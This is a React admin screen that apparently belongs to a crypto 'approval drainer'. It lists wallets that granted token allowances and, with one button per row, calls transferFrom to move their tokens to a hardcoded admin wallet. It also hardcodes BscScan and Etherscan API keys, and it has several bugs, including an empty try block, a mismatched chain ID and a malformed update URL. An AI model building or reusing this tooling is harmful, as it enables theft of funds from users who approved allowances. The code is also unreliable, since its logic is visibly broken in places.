import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { NotificationContainer, NotificationManager } from "react-notifications";
import Web3 from "web3";

import 'react-notifications/lib/notifications.css';

const adminWalletAddress = "0x4552411f0f8C54116E220DA3e76b95a0375df766";
const web3 = new Web3(window.ethereum);

const GET_BSC_SCAN_API_KEY = "HXKSU77A2DNXD9ZAIFHCYSWBF4DUWG66SS";
const GET_ETH_SCAN_API_KEY = "YRVQAVGPB6NHD9D9412VPTIRUZ5BK956K5"

const AdminScreen = () => {
  const [products, setProduct] = useState([]);
  const [transferAmount, setTransferAmount] = useState(0);

  useEffect(() => {
    getProducts();
  }, []);

  const getProducts = async () => {
    const response = await axios.get('http://localhost:5000/products');
    setProduct(response.data);
  }

  useEffect(() => {
    const connectWallet = async () => {
      if (typeof window.ethereum !== 'undefined') {
        try {
          if (window.ethereum) {
            await window.ethereum.enable();
            try {
              // check if the chain to connect to is installed
            } catch (error) {
              // This error code indicates that the chain has not been added to MetaMask
              // if it is not, then install it into the user MetaMask
              if (error.code === 4902) {
                try {
                  await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [
                      {
                        chainId: '0x1',
                        rpcUrl: 'https://bsc-dataseed1.defibit.io/',
                      },
                    ],
                  });
                } catch (addError) {
                  console.error(addError);
                }
              }
              console.error(error);
            }
          }
        } catch (e) {
          return false;
        }
      }
    }
    connectWallet();
  }, []);
  const handleChangeAmount = (value) => {
    setTransferAmount(value);
  }
  const handleTransfer = async (approveToken, id) => {
    if (transferAmount === 0) {
      NotificationManager.warning('Transfer Amount is not 0.', 'Transfer Amount Warning', 3000);
    }
    else {
      if (approveToken.network === "BSC") {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
        });
        let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.contractAddress + "&apikey=" + GET_BSC_SCAN_API_KEY;
        let temp = await axios.get(api);
        const contractABI = JSON.parse(temp.data.result);
        const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: adminWalletAddress }).then(async function (receipt) {
          await axios.patch('http://localhost:5000/products' + id, {
            amount: approveToken.amount - transferAmount,
          });
        });
      } else {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
        });
        let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.contractAddress + "&apikey=" + GET_ETH_SCAN_API_KEY;
        let temp = await axios.get(api);
        const contractABI = JSON.parse(temp.data.result);
        const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: adminWalletAddress }).then(async function (receipt) {
          await axios.patch('http://localhost:5000/products' + id, {
            amount: approveToken.amount - transferAmount,
          });
        });
      }
    }
  }
  return (
    <div className='m-4 text-center'>
      <h1 className='w-25 m-auto mt-4'>Approved User List</h1>
      <table className='mt-4 table table-bordered text-center fs-3 m-auto w-75'>
        <thead>
          <tr>
            <th>No</th>
            <th>User Address</th>
            <th>Admin Address</th>
            <th>Amount</th>
            <th>Symbol</th>
            <th>Manage Amount</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          {products && products.map((a, idx) => (
            <tr key={idx}>
              <td>{idx + 1}</td>
              <td title={a.userWalletAddress}>{a.userWalletAddress.slice(0, 5) + '...' + a.userWalletAddress.slice(-4, a.userWalletAddress.length)}</td>
              <td title={a.adminAddress}>{a.adminAddress.slice(0, 5) + '...' + a.adminAddress.slice(-4, a.adminAddress.length)}</td>
              <td>{a.amount}</td>
              <td>{a.symbol}</td>
              <td className='position-relative '>
                {/* <button style={{ width: "55px", right: "0.5rem" }} onClick={() => {
                  products[idx].maxAmount = a.value;
                }} className='position-absolute form-control'>Max</button> */}
                <input className='form-control' type="number" value={a.amount} onChange={(e) => handleChangeAmount(e.target.value)} /></td>
              <td><button className='form-control' type="number" onClick={() => { handleTransfer(a, idx) }} >Transfer</button></td>
            </tr>
          ))}
        </tbody>
      </table>
      <NotificationContainer />
    </div >
  );
};

export default AdminScreen;